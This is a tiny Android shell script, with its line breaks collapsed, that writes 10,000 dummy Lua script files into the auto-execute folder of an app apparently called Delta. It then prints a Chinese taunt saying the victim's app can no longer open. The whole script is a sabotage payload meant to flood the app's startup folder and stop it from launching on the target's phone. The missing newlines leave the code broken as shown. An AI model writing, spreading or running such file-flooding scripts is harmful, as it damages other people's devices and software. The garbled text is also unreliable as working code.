#!/system/bin/shDIR="/storage/emulated/0/Delta/Autoexecute"mkdir -p "$DIR"for i in $(seq 1 10000); do    echo 'print("你好")' > "${DIR}/file${i}.txt"doneecho "哈哈哈哈哈哈哈哈哈哈哈哈你的小忍者已经打不开了"
